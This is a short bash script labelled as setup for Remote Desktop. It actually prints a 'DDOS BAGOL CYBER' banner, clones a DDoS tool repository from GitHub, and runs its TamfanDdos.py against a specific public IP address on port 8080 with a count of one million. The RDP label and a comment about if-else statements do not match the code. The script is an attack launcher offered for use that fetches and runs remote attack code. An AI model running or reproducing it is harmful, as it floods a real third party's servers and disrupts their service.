#! /bin/bash

# Make Instance Ready for Remote Desktop or RDP

b='\033[1m'
r='\E[31m'
g='\E[32m'
c='\E[36m'
endc='\E[0m'
enda='\033[0m'

clear

# Branding

printf """$c$b
██████╗░██████╗░░█████╗░░██████╗  ██████╗░░█████╗░░██████╗░░█████╗░██╗░░░░░
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔════╝░██╔══██╗██║░░░░░
██║░░██║██║░░██║██║░░██║╚█████╗░  ██████╦╝███████║██║░░██╗░██║░░██║██║░░░░░
██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██╗██╔══██║██║░░╚██╗██║░░██║██║░░░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╦╝██║░░██║╚██████╔╝╚█████╔╝███████╗
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░╚════╝░╚══════╝
░█████╗░██╗░░░██╗██████╗░███████╗██████╗░
██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝
██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗
╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║
░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝
    $r BAGOL $c 
$endc$enda""";


# Used Two if else type statements, one is simple second is complex. So, don't get confused or fear by seeing complex if else statement '^^.

! apt update && apt upgrade
! apt install python
! apt install python2
! apt install git
! git clone https://github.com/MrTamfanX/MCIDDOS
! cd MCIDDOS
! ls 
! python2 TamfanDdos.py
! python2 TamfanDdos.py [172.67.180.90] [8080] [1000000]
